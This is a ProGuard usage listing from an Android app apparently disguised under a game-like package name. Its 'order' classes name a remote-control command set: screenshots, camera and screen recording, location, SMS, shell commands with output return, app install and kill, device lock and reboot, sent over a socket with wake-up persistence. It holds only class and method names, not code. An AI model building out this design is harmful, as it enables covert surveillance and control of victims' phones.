proguard/usage.txt
com.byc.wzry.BuildConfig
com.byc.wzry.ProcessConnection$Stub:
    private static final java.lang.String DESCRIPTOR
    23:30:public static com.byc.wzry.ProcessConnection asInterface(android.os.IBinder)
com.byc.wzry.ProcessConnection$Stub$Proxy
com.byc.wzry.R
com.byc.wzry.R$attr
com.byc.wzry.R$dimen
com.byc.wzry.R$drawable
com.byc.wzry.R$id
com.byc.wzry.R$layout
com.byc.wzry.R$menu
com.byc.wzry.R$string
com.byc.wzry.R$style
com.byc.wzry.R$xml
...
order.JobWakeUpService:
    private static final int JOB_WAKEUP_ID_ORDER
    private static final int JOB_WAKEUP_ID_CT
    private static final long JOB_WAKEUP_INTERVAL_ORDER
    private static final long JOB_WAKEUP_INTERVAL_CT
order.OrderService:
    private static final int MSG_ORDER
    private static final int MSG_DATA
    public static final int ORDER_THREAD_STATE_NO_START
    public static final int ORDER_THREAD_STATE_DIED
    public static final int ORDER_THREAD_STATE_QUERYING
    public static final int ORDER_THREAD_STATE_ALIVE
    public static final int ORDER_THREAD_STATE_CONNECTED
    public static final int ORDER_THREAD_STATE_DISCONNECTED
    166:170:private void startAlarm()
    530:535:public void SendBmp(int,android.graphics.Bitmap,int)
    724:754:public static void arouseOrderThread(android.content.Context)
    765:776:public static void startOrderServices(android.content.Context)
    1012:1017:private void processLight()
    1087:1103:private void processShotScreen()
    1108:1114:private void processLocation()
    1296:1317:private void smsPrepare()
    1564:1574:private void testDelay()
    105:105:static synthetic order.OrderService access$3()
order.OrderService$14
order.OrderService$19
order.OrderService$5
order.OrderService$7
order.OrderService$OrderThread:
    591:598:public void restartOrder()
    603:608:public void stopOrder()
    613:624:public boolean isAlive2()
    627:628:public boolean isConnected()
order.Sock:
    private static final int DATA_SIZE
    137:137:public boolean SendPH()
    184:200:public boolean SendBmp(android.graphics.Bitmap)
order.file.FileUtils:
    public static final int BYTE
    public static final int KB
    public static final int MB
    public static final int GB
    18:18:public FileUtils()
    79:90:public static long getSDAllSizeKB()
    100:107:public static long getSDAvalibleSizeKB()
    118:118:public static long getFileSize(java.lang.String)
    129:140:public static long getFileSize(java.io.File)
    221:221:public static boolean isFileExists(java.lang.String)
    275:275:public static double getFileSize(java.lang.String,int)
order.file.ZipUtil:
    18:18:public ZipUtil()
    98:171:public static void unzip(java.lang.String,java.lang.String)
order.order:
    public static final int PID
    public static final int VER
    public static final int ENC
    public static final int CMD_TEST
    public static final int CMD_READY
    public static final int CMD_INFO
    public static final int CMD_CALL
    public static final int CMD_LOCK
    public static final int CMD_SHOT
    public static final int CMD_SHOTCODE
    public static final int CMD_RETURN
    public static final int CMD_POS
    public static final int CMD_LIGHT
    public static final int CMD_GIVE_POWER
    public static final int CMD_CAMERA
    public static final int CMD_SLIDE
    public static final int CMD_CMD
    public static final int CMD_GET_CMD_OUT
    public static final int CMD_REBOOT
    public static final int CMD_SHUTDOWN
    public static final int CMD_RESTART
    public static final int CMD_UNLOCK
    public static final int CMD_RECORD_SCREEN_START
    public static final int CMD_RECORD_SCREEN_END
    public static final int CMD_RECORD_VIDEO_START
    public static final int CMD_RECORD_VIDEO_END
    public static final int CMD_HOME
    public static final int CMD_GET_INSTALL_APP_INFO
    public static final int CMD_INSTALL_APP
    public static final int CMD_UNINSTALL_APP
    public static final int CMD_RUN_APP
    public static final int CMD_KILL_APP
    public static final int CMD_LONG_CLICK
    public static final int CMD_INPUT
    public static final int CMD_CAMERA_CAP_START
    public static final int CMD_CAMERA_CAP_END